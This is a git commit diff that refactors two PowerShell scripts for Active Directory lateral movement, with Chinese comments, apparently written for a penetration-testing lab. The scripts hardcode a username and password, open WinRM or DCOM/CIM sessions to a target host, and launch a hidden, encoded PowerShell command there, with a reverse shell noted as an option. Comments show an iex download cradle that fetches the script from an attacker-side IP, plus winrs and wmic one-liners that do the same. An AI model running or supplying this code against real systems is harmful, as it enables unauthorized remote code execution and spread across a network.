8c3900bde33c1360eeb1a199c23f778fe093c412
cyhfvg <code.guangzhou.zhang@outlook.com>
2023-09-16 15:19:33 +0800

    refactor(`ad-lateral`): `pwsh-winrm`, `pwsh-wmic`

--- example/pwsh-winrm-exec.ps1
+++ example/pwsh-winrm-exec.ps1
@@ -1,11 +1,22 @@
-# 创建credential 对象
+# powershell模拟WinRM执行命令 winrs -r:192.168.239.72 -u:jen -p:Nexus123! "cmd /C powershell -nop -w hidden -Enc JAB...ABC"
+#
+# 调用方式:
+# iex (New-Object Net.WebClient).downloadstring('http://192.168.45.178/t_ad-lateral-movement-with-winrm.ps1')
+# Enter-PSSession 1
+#
+# {{{ TODO: change this
 $username = 'jen';
 $password = 'Nexus123!';
+$target = '192.168.239.72'
+# }}}
+
+# 创建credential 对象
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
 # 创建session, 结果中显示session id
-New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+New-PSSession -ComputerName $target -Credential $credential
 
 # 进入创建的session; session id
-Enter-PSSession 1
+#Enter-PSSession 1
+Write-Output "`n enter PSSession use cmd like:`n`nEnter-PSSession 1"
--- example/pwsh-wmic-exec.ps1
+++ example/pwsh-wmic-exec.ps1
@@ -1,16 +1,25 @@
-# 创建credential 对象
+#
+# 调用方法: iex (New-Object Net.WebClient).downloadstring('http://192.168.45.178/t_ad-lateral-movement-with-wmic.ps1')
+#
+# powershell方式模拟wmic手动方式: wmic /node:192.168.239.72 /user:jen /password:Nexus123! process call create "cmd /C powershell -nop -w hidden -Enc ABC...DE"
+#
+# {{{ TODO: change this
 $username = 'jen';
 $password = 'Nexus123!';
+$command = 'powershell -nop -w hidden -Enc JAB...ABC';
+$target = '192.168.239.72'
+# }}}
+
+# 创建credential 对象
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
 # 创建通用信息模型 CIM, 并为wmi会话指定协议为 DCOM
 $options = New-CimSessionOption -Protocol DCOM
-$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options
+$session = New-Cimsession -ComputerName $target -Credential $credential -SessionOption $options
 # revshell
 #$command = 'powershell -enc JAB...AD';
 # poc
-$command = 'calc';
 
 # 使用Win32_Process对象创建进程
-Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
